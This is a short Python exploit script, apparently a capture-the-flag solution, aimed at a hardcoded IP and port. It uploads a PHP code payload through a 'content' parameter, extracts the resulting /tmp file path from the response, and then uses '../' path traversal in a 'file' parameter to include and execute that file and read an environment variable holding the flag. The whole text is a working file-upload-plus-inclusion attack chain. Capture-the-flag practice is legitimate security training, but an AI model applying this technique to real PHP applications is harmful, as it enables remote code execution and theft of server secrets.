import requests
import re

ip = "124.16.75.117"
port = 51001

BASE_URL = f"http://{ip}:{port}/index.php"

payload = '<?=getenv("flag");?>'

# Step 1: 上传 payload（触发 file_put_contents）
params_upload = {"content": payload}
print("[*] Uploading malicious PHP payload...")
resp = requests.get(BASE_URL, params=params_upload)
print(resp.text)

# 提取返回的 /tmp/xxxx.txt 路径
match = re.search(r"/tmp/[a-f0-9]+\.txt", resp.text)
if not match:
    print("[-] Failed to get file path from response.")
    print("Response was:", resp.text)
    exit(1)

file_path = match.group(0)
print(f"[+] Uploaded PHP to {file_path}")

# Step 2: 访问该文件以执行代码，传入 GET 参数 flag=flag
params_exec = {"file": "../../../.." + file_path, "flag": "flag"}
print()
print("[*] Executing uploaded file to read flag...")
resp = requests.get(BASE_URL, params=params_exec)

print("[+] Server response (likely the flag):")
print(resp.text.strip())
